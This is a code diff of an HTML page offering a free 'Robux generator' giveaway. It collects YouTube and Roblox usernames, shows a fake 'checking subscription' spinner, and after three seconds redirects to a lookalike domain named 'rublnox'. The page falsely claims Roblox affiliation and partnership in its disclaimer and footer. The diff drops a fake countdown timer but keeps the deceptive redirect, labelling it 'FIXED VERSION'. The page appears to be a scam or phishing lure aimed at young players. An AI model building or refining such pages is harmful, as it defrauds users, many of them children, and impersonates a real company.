@@ -231,39 +231,21 @@
                     <div class="spinner"></div>
                     <p>Checking your subscription status...</p>
                 </div>
-                
-                <!-- <div class="timer">
-                    <div class="timer-title">OFFER EXPIRES IN:</div>
-                    <div id="countdown">23:59:59</div>
-                </div> -->
             </div>
             
             <div class="disclaimer">
                 <strong>Note:</strong> This is a promotional Giveaway offer for our YouTube subscribers only. affiliated with Roblox Corporation. Limited to one claim per user.
             </div>
             
-            <p class="verified-badge" style="color: black;"><a href="https://www.roblox.com/">© 2025 Roblox Corporation</a>. All rights reserved. <a href="https://www.career-maestros.com">Career-Maestros</a> Official Partner Giveaway.</p>
+<p class="verified-badge" style="color: black;">
+    © 2025 <a href="https://www.roblox.com/">Roblox Corporation</a>. All rights reserved. 
+    Official Partner Giveaway by <a href="https://www.career-maestros.com">Career-Maestros</a>.
+</p>
         </div>
     </div>
 
     <script>
-        // Countdown timer
-        function updateCountdown() {
-            const now = new Date();
-            const midnight = new Date();
-            midnight.setHours(24, 0, 0, 0);
-            
-            const diff = midnight - now;
-            
-            const hours = Math.floor(diff / (1000 * 60 * 60));
-            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
-            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-            
-            document.getElementById('countdown').textContent = 
-                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-        }
-        
-        // Generate Robux function
+        // Generate Robux function - FIXED VERSION
         function generateRobux() {
             const youtubeUsername = document.getElementById("youtubeUsername").value;
             const robloxUsername = document.getElementById("robloxUsername").value;
@@ -277,18 +259,14 @@
             document.getElementById("generateBtn").style.display = "none";
             document.getElementById("loading").style.display = "block";
             
-            // Simulate verification for 3 seconds
+            // Simulate verification for 3 seconds THEN redirect
             setTimeout(function() {
-                // Redirect to the offer page
                 window.location.href = "https://rublnox-abdessamads-projects-0f41d1c1.vercel.app/";
             }, 3000);
         }
         
         // Initialize everything when page loads
         window.onload = function() {
-            setInterval(updateCountdown, 1000);
-            updateCountdown();
-            
             document.getElementById("generateBtn").addEventListener("click", generateRobux);
         };
     </script>
